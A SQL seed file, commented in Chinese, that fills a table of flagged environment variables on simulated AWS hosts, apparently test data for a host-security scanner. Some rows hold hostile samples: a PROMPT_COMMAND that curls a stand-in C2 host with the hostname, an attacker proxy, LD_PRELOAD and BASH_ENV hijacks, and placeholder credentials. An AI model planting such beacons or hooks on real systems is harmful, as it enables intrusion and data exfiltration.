-- =====================================================
-- 模拟数据: asset_env_suspicious (可疑环境变量表)
-- 数据量: 50条
-- 说明: AWS ap-southeast-1 (Singapore) 区域 EC2 实例
-- VPC CIDR: 10.0.0.0/16
-- 子网划分:
--   10.0.1.x  Web/API 层 (公有子网)
--   10.0.2.x  应用层 (私有子网)
--   10.0.3.x  数据层 (私有子网)
--   10.0.4.x  EKS/K8s 层 (私有子网)
--   10.0.5.x  DevOps 层 (私有子网)
--   10.0.6.x  监控层 (私有子网)
--   10.0.7.x  基础设施/安全层 (私有子网)
-- OS: Ubuntu 22.04/20.04, Amazon Linux 2/2023 (无 Windows)
-- =====================================================

INSERT INTO asset_env_suspicious (agent_id, host_name, host_ip, var_name, var_value, suspicious_reasons, source, created_at, updated_at) VALUES

-- ==========================================
-- Web/API 层 (10.0.1.x)
-- ==========================================
-- aws-web-01 可疑环境变量
('agent-001-a1b2c3d4', 'aws-web-01', '10.0.1.10', 'LD_PRELOAD', '/tmp/.hidden/libhook.so', '可疑的LD_PRELOAD路径，可能用于劫持库函数', '/etc/environment', NOW() - INTERVAL '5 days', NOW()),
('agent-001-a1b2c3d4', 'aws-web-01', '10.0.1.10', 'PATH', '/tmp:/var/tmp:/usr/local/bin:/usr/bin:/bin', 'PATH包含可写目录/tmp，可能导致路径劫持攻击', '/home/www-data/.bashrc', NOW() - INTERVAL '3 days', NOW()),
('agent-001-a1b2c3d4', 'aws-web-01', '10.0.1.10', 'BASH_ENV', '/tmp/.malicious_script.sh', '可疑的BASH_ENV设置，可能在bash启动时执行恶意脚本', '/etc/environment', NOW() - INTERVAL '1 day', NOW()),
-- aws-web-02 可疑环境变量
('agent-002-e5f6g7h8', 'aws-web-02', '10.0.1.11', 'HTTP_PROXY', 'http://evil-proxy.attacker.com:8080', '可疑的HTTP代理设置，可能用于流量劫持', '/etc/profile.d/proxy.sh', NOW() - INTERVAL '2 days', NOW()),
('agent-002-e5f6g7h8', 'aws-web-02', '10.0.1.11', 'HISTFILE', '/dev/null', '历史记录被重定向到/dev/null，可能试图隐藏命令历史', '/root/.bashrc', NOW() - INTERVAL '4 days', NOW()),
-- aws-api-01 可疑环境变量
('agent-003-i9j0k1l2', 'aws-api-01', '10.0.1.20', 'AWS_ACCESS_KEY_ID', 'AKIAIOSFODNN7EXAMPLE', 'AWS Access Key明文存储在环境变量中，存在凭证泄露风险', '/home/ubuntu/.bashrc', NOW() - INTERVAL '20 days', NOW()),
('agent-003-i9j0k1l2', 'aws-api-01', '10.0.1.20', 'AWS_SECRET_ACCESS_KEY', 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', 'AWS Secret Key明文存储在环境变量中，存在凭证泄露风险', '/home/ubuntu/.bashrc', NOW() - INTERVAL '20 days', NOW()),
('agent-003-i9j0k1l2', 'aws-api-01', '10.0.1.20', 'ENV', '/tmp/.profile', '可疑的ENV变量，指向临时目录中的配置文件', '/root/.bashrc', NOW() - INTERVAL '8 days', NOW()),
-- aws-api-02 可疑环境变量
('agent-004-m3n4o5p6', 'aws-api-02', '10.0.1.21', 'DEBUG', 'true', '生产环境启用DEBUG模式，可能泄露敏感信息', '/etc/environment', NOW() - INTERVAL '30 days', NOW()),
('agent-004-m3n4o5p6', 'aws-api-02', '10.0.1.21', 'NODE_OPTIONS', '--inspect=0.0.0.0:9229', 'Node.js调试端口对外开放，存在远程代码执行风险', '/etc/profile.d/node.sh', NOW() - INTERVAL '25 days', NOW()),
-- aws-gateway-01 可疑环境变量
('agent-005-q7r8s9t0', 'aws-gateway-01', '10.0.1.30', 'SSL_CERT_FILE', '/tmp/ca-bundle.crt', 'SSL证书文件存放在不安全的临时目录', '/etc/environment', NOW() - INTERVAL '50 days', NOW()),

-- ==========================================
-- 应用层 (10.0.2.x)
-- ==========================================
-- aws-app-01 可疑环境变量
('agent-006-u1v2w3x4', 'aws-app-01', '10.0.2.10', 'JAVA_TOOL_OPTIONS', '-javaagent:/tmp/agent.jar', '可疑的Java代理设置，可能用于注入恶意代码', '/etc/environment', NOW() - INTERVAL '1 day', NOW()),
('agent-006-u1v2w3x4', 'aws-app-01', '10.0.2.10', 'PROMPT_COMMAND', 'curl -s http://c2.evil.com/beacon?h=$(hostname)', '可疑的PROMPT_COMMAND，可能用于命令执行回调', '/home/app/.bashrc', NOW() - INTERVAL '6 hours', NOW()),
('agent-006-u1v2w3x4', 'aws-app-01', '10.0.2.10', 'CLASSPATH', '/tmp/malicious.jar:/opt/app/lib/*', '可疑的CLASSPATH包含临时目录中的JAR文件', '/etc/environment', NOW() - INTERVAL '12 days', NOW()),
-- aws-app-02 可疑环境变量
('agent-007-y5z6a7b8', 'aws-app-02', '10.0.2.11', 'PYTHONPATH', '/tmp/python_modules', '可疑的PYTHONPATH指向临时目录', '/etc/environment', NOW() - INTERVAL '30 days', NOW()),
('agent-007-y5z6a7b8', 'aws-app-02', '10.0.2.11', 'LD_LIBRARY_PATH', '/tmp/libs:/var/tmp/libs', '可疑的库路径，包含可写临时目录', '/home/app/.profile', NOW() - INTERVAL '7 days', NOW()),
-- aws-app-03 可疑环境变量
('agent-008-c9d0e1f2', 'aws-app-03', '10.0.2.12', 'AWS_ACCESS_KEY_ID', 'AKIAI44QH8DHBEXAMPLE', 'AWS Access Key明文硬编码在环境变量中', '/etc/profile.d/aws.sh', NOW() - INTERVAL '15 days', NOW()),
('agent-008-c9d0e1f2', 'aws-app-03', '10.0.2.12', 'AWS_SECRET_ACCESS_KEY', 'je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY', 'AWS Secret Key明文硬编码在环境变量中', '/etc/profile.d/aws.sh', NOW() - INTERVAL '15 days', NOW()),
-- aws-worker-01 可疑环境变量
('agent-009-g3h4i5j6', 'aws-worker-01', '10.0.2.20', 'RUBYLIB', '/tmp/ruby_libs', '可疑的RUBYLIB指向临时目录', '/home/worker/.bashrc', NOW() - INTERVAL '22 days', NOW()),
('agent-009-g3h4i5j6', 'aws-worker-01', '10.0.2.20', 'PERL5LIB', '/var/tmp/perl_libs', '可疑的PERL5LIB指向可写临时目录', '/root/.bashrc', NOW() - INTERVAL '85 days', NOW()),

-- ==========================================
-- 数据层 (10.0.3.x)
-- ==========================================
-- aws-mysql-01 可疑环境变量
('agent-011-o1p2q3r4', 'aws-mysql-01', '10.0.3.10', 'MYSQL_PWD', 'P@ssw0rd123!', '数据库密码明文存储在环境变量中，存在安全风险', '/etc/profile', NOW() - INTERVAL '10 days', NOW()),
-- aws-pg-01 可疑环境变量
('agent-013-w9x0y1z2', 'aws-pg-01', '10.0.3.12', 'PGPASSWORD', 'postgres_secret_2024', 'PostgreSQL密码明文存储在环境变量中', '/etc/environment', NOW() - INTERVAL '15 days', NOW()),
-- aws-redis-01 可疑环境变量
('agent-014-a3b4c5d6', 'aws-redis-01', '10.0.3.20', 'REDIS_PASSWORD', 'redis_pass_2024', 'Redis密码明文存储在环境变量中', '/etc/environment', NOW() - INTERVAL '45 days', NOW()),
-- aws-es-01 可疑环境变量
('agent-016-i1j2k3l4', 'aws-es-01', '10.0.3.30', 'ELASTIC_PASSWORD', 'elastic_secret_2024', 'Elasticsearch密码明文存储在环境变量中', '/etc/environment', NOW() - INTERVAL '100 days', NOW()),
('agent-016-i1j2k3l4', 'aws-es-01', '10.0.3.30', 'ES_JAVA_OPTS', '-Xms31g -Xmx31g -Dlog4j2.formatMsgNoLookups=false', 'Log4j2 lookup未禁用，可能存在Log4Shell漏洞', '/etc/elasticsearch/jvm.options.d/heap.options', NOW() - INTERVAL '180 days', NOW()),
-- aws-kafka-01 可疑环境变量
('agent-019-u3v4w5x6', 'aws-kafka-01', '10.0.3.40', 'KAFKA_OPTS', '-Djava.security.auth.login.config=/tmp/jaas.conf', '可疑的JAAS配置文件路径', '/etc/kafka/kafka-env.sh', NOW() - INTERVAL '90 days', NOW()),
('agent-019-u3v4w5x6', 'aws-kafka-01', '10.0.3.40', 'JMX_PORT', '9999', 'JMX端口暴露，可能存在远程代码执行风险', '/etc/kafka/kafka-env.sh', NOW() - INTERVAL '85 days', NOW()),
-- aws-mq-01 可疑环境变量
('agent-021-c1d2e3f4', 'aws-mq-01', '10.0.3.50', 'RABBITMQ_DEFAULT_PASS', 'mq_admin_pass', 'RabbitMQ密码明文存储在环境变量中', '/etc/rabbitmq/rabbitmq-env.conf', NOW() - INTERVAL '60 days', NOW()),
-- aws-mongo-01 可疑环境变量
('agent-022-g5h6i7j8', 'aws-mongo-01', '10.0.3.60', 'MONGO_INITDB_ROOT_PASSWORD', 'mongo_root_2024!', 'MongoDB root密码明文存储在环境变量中', '/etc/environment', NOW() - INTERVAL '48 days', NOW()),
-- ==========================================
-- EKS/K8s 层 (10.0.4.x)
-- ==========================================
-- aws-eks-master-01 可疑环境变量
('agent-023-k9l0m1n2', 'aws-eks-master-01', '10.0.4.10', 'KUBECONFIG', '/tmp/admin.conf', 'kubeconfig文件存放在不安全的临时目录', '/root/.bashrc', NOW() - INTERVAL '30 days', NOW()),
('agent-023-k9l0m1n2', 'aws-eks-master-01', '10.0.4.10', 'ETCD_ROOT_PASSWORD', 'etcd_pass_2024', 'etcd密码明文存储在环境变量中', '/etc/etcd/etcd.conf', NOW() - INTERVAL '28 days', NOW()),
('agent-023-k9l0m1n2', 'aws-eks-master-01', '10.0.4.10', 'HELM_HOME', '/tmp/.helm', '可疑的Helm目录位于临时目录', '/root/.bashrc', NOW() - INTERVAL '18 days', NOW()),
-- aws-eks-node-01 可疑环境变量
('agent-024-o3p4q5r6', 'aws-eks-node-01', '10.0.4.11', 'CONTAINER_RUNTIME_ENDPOINT', 'unix:///run/containerd/containerd.sock', '容器运行时socket暴露，需确保权限正确', '/etc/environment', NOW() - INTERVAL '25 days', NOW()),
-- aws-eks-node-02 可疑环境变量
('agent-025-s7t8u9v0', 'aws-eks-node-02', '10.0.4.12', 'DOCKER_HOST', 'tcp://0.0.0.0:2375', 'Docker API未加密对外暴露，存在远程代码执行风险', '/etc/profile.d/docker.sh', NOW() - INTERVAL '40 days', NOW()),

-- ==========================================
-- DevOps 层 (10.0.5.x)
-- ==========================================
-- aws-jenkins-01 可疑环境变量
('agent-028-e9f0g1h2', 'aws-jenkins-01', '10.0.5.10', 'JENKINS_ADMIN_PASSWORD', 'jenkins_admin_2024', 'Jenkins管理员密码明文存储在环境变量中', '/etc/default/jenkins', NOW() - INTERVAL '50 days', NOW()),
('agent-028-e9f0g1h2', 'aws-jenkins-01', '10.0.5.10', 'GIT_TOKEN', 'ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx', 'GitHub Token明文存储在环境变量中', '/var/lib/jenkins/.bashrc', NOW() - INTERVAL '35 days', NOW()),
('agent-028-e9f0g1h2', 'aws-jenkins-01', '10.0.5.10', 'AWS_ACCESS_KEY_ID', 'AKIAJEXAMPLE12345678', 'AWS Access Key明文存储在CI/CD环境中，应使用IAM角色', '/var/lib/jenkins/.bashrc', NOW() - INTERVAL '32 days', NOW()),
('agent-028-e9f0g1h2', 'aws-jenkins-01', '10.0.5.10', 'AWS_SECRET_ACCESS_KEY', 'abcdefghijklmnopqrstuvwxyz1234EXAMPLEKEY', 'AWS Secret Key明文存储在CI/CD环境中，应使用IAM角色', '/var/lib/jenkins/.bashrc', NOW() - INTERVAL '32 days', NOW()),
-- aws-gitlab-01 可疑环境变量
('agent-029-i3j4k5l6', 'aws-gitlab-01', '10.0.5.11', 'GITLAB_ROOT_PASSWORD', 'gitlab_root_2024', 'GitLab root密码明文存储在环境变量中', '/etc/gitlab/gitlab.rb', NOW() - INTERVAL '55 days', NOW()),
('agent-029-i3j4k5l6', 'aws-gitlab-01', '10.0.5.11', 'GITLAB_SHARED_RUNNERS_REGISTRATION_TOKEN', 'GR1348941xxxxxxxxxxxxxxxx', 'GitLab Runner注册Token泄露', '/etc/environment', NOW() - INTERVAL '48 days', NOW()),
-- aws-harbor-01 可疑环境变量
('agent-030-m7n8o9p0', 'aws-harbor-01', '10.0.5.12', 'HARBOR_ADMIN_PASSWORD', 'Harbor12345', 'Harbor管理员密码明文存储在环境变量中', '/opt/harbor/harbor.yml', NOW() - INTERVAL '40 days', NOW()),
-- aws-nexus-01 可疑环境变量
('agent-031-q1r2s3t4', 'aws-nexus-01', '10.0.5.13', 'NEXUS_ADMIN_PASSWORD', 'nexus_admin_2024', 'Nexus管理员密码明文存储在环境变量中', '/opt/nexus/etc/nexus.properties', NOW() - INTERVAL '38 days', NOW()),

-- ==========================================
-- 监控层 (10.0.6.x)
-- ==========================================
-- aws-prometheus-01 可疑环境变量
('agent-033-y9z0a1b2', 'aws-prometheus-01', '10.0.6.10', 'GRAFANA_ADMIN_PASSWORD', 'grafana_admin_2024', 'Grafana管理员密码明文存储', '/etc/grafana/grafana.ini', NOW() - INTERVAL '60 days', NOW()),
-- aws-elk-01 可疑环境变量
('agent-035-g7h8i9j0', 'aws-elk-01', '10.0.6.12', 'ELASTIC_PASSWORD', 'elk_cluster_secret_2024', 'Elasticsearch集群密码明文存储', '/etc/environment', NOW() - INTERVAL '70 days', NOW()),

-- ==========================================
-- 基础设施/安全层 (10.0.7.x)
-- ==========================================
-- aws-vpn-01 可疑环境变量
('agent-038-s9t0u1v2', 'aws-vpn-01', '10.0.7.10', 'OPENVPN_CA_KEY_PASSPHRASE', 'vpn_ca_pass_2024', 'OpenVPN CA密钥密码明文存储', '/etc/openvpn/server.conf', NOW() - INTERVAL '200 days', NOW()),
-- aws-mail-01 可疑环境变量
('agent-042-i5j6k7l8', 'aws-mail-01', '10.0.7.14', 'SMTP_PASSWORD', 'mail_relay_pass', 'SMTP中继密码明文存储', '/etc/postfix/sasl_passwd', NOW() - INTERVAL '120 days', NOW()),
-- aws-ldap-01 可疑环境变量
('agent-043-m9n0o1p2', 'aws-ldap-01', '10.0.7.15', 'LDAP_ADMIN_PASSWORD', 'ldap_admin_2024', 'LDAP管理员密码明文存储', '/etc/openldap/slapd.conf', NOW() - INTERVAL '90 days', NOW()),
-- aws-proxy-01 可疑环境变量
('agent-044-q3r4s5t6', 'aws-proxy-01', '10.0.7.16', 'no_proxy', '', 'no_proxy为空，所有流量都经过代理', '/etc/environment', NOW() - INTERVAL '45 days', NOW()),
-- aws-consul-01 可疑环境变量
('agent-049-k3l4m5n6', 'aws-consul-01', '10.0.3.72', 'CONSUL_HTTP_TOKEN', 'b1gs33cr3t-xxxx-xxxx-xxxx-xxxxxxxxxxxx', 'Consul管理Token明文存储在环境变量中', '/etc/consul.d/consul.hcl', NOW() - INTERVAL '35 days', NOW()),
-- aws-vault-01 可疑环境变量
('agent-050-o7p8q9r0', 'aws-vault-01', '10.0.7.20', 'VAULT_TOKEN', 'hvs.xxxxxxxxxxxxxxxxxxxxxxxxxxxx', 'HashiCorp Vault Token明文存储在环境变量中', '/root/.bashrc', NOW() - INTERVAL '25 days', NOW());
